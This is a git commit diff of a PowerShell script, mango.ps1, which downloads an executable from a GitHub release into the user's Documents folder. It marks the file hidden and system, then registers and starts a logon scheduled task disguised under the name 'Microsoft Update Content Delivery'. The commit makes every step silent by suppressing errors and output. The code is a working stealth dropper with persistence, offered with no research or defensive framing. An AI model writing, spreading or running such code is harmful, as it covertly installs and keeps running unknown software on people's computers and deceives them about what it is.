746db8fba2be366fd791c08dc355c6a7fa1cbe7c
Seva <68725282+sevcator@users.noreply.github.com>
2025-06-30 09:22:08 +0700

    Update mango.ps1

--- mango.ps1
+++ mango.ps1
@@ -1,16 +1,11 @@
 Clear-Host
-
 $downloadUrl = "https://github.com/sevcator/mango-mango-mango/releases/download/1/MANGO.exe"
 $destinationPath = "$env:USERPROFILE\Documents\mango.exe"
-Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
-
-attrib +h +s $destinationPath
-
+Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -ErrorAction SilentlyContinue > $null 2>&1
+attrib +h +s $destinationPath > $null 2>&1
 $taskName = "Microsoft Update Content Delivery"
 $action = New-ScheduledTaskAction -Execute $destinationPath
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $env:USERNAME
-
-Start-ScheduledTask -TaskName $taskName
-
+$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $env:USERNAME -ErrorAction SilentlyContinue > $null 2>&1
+Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue > $null 2>&1
 exit
